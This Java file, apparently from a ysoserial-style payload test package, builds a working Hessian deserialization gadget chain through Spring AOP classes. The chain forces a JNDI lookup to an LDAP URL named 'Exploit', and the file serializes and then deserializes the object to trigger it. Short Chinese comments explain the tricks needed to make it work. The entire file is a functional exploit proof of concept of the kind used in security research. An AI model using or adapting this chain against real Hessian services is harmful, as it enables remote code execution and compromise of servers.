package ysoserial.test.payloads;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.caucho.hessian.io.SerializerFactory;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import org.springframework.scheduling.annotation.AsyncAnnotationAdvisor;
import ysoserial.payloads.util.Reflections;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class HessianSpringTest {
    public static void main(String[] args) throws Exception {
        String url = "ldap://127.0.0.1:9999/Exploit";
        SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();
        simpleJndiBeanFactory.setShareableResources(url);//这里一定要设置,为了过Singleton()

        Class<?> AbstractBeanFactoryPointcutAdvisor = Class.forName("org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor");
        DefaultBeanFactoryPointcutAdvisor defaultBeanFactoryPointcutAdvisor = new DefaultBeanFactoryPointcutAdvisor();
        Field adviceBeanName = AbstractBeanFactoryPointcutAdvisor.getDeclaredField("adviceBeanName");
        adviceBeanName.setAccessible(true);
        adviceBeanName.set(defaultBeanFactoryPointcutAdvisor, url);
        Field beanFactory = AbstractBeanFactoryPointcutAdvisor.getDeclaredField("beanFactory");
        beanFactory.setAccessible(true);
        beanFactory.set(defaultBeanFactoryPointcutAdvisor, simpleJndiBeanFactory);

        AsyncAnnotationAdvisor asyncAnnotationAdvisor = new AsyncAnnotationAdvisor();
        HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(1);
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(2);
        HashMap hashMap = new HashMap();
        hashMap.put(hotSwappableTargetSource, "1");
        hashMap.put(hotSwappableTargetSource1, "2");
        Reflections.setFieldValue(hotSwappableTargetSource,"target",defaultBeanFactoryPointcutAdvisor);
        Reflections.setFieldValue(hotSwappableTargetSource1,"target",asyncAnnotationAdvisor);

        String str = Hessian_serialize(hashMap);
        Hessian_unserialize(str);
    }

    public static void Hessian_unserialize(String obj) throws IOException, ClassNotFoundException {
        byte[] code = Base64.getDecoder().decode(obj);
        ByteArrayInputStream byteArrayInputStream=new ByteArrayInputStream(code);
        HessianInput hessianInput=new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }

    public static String Hessian_serialize(Object object) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
        HessianOutput hessianOutput=new HessianOutput(byteArrayOutputStream);
        SerializerFactory serializerFactory=new SerializerFactory(); //无需继承Serializable也可进行序列化和反序列化
        serializerFactory.setAllowNonSerializable(true);
        hessianOutput.setSerializerFactory(serializerFactory);
        hessianOutput.writeObject(object);
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }
}
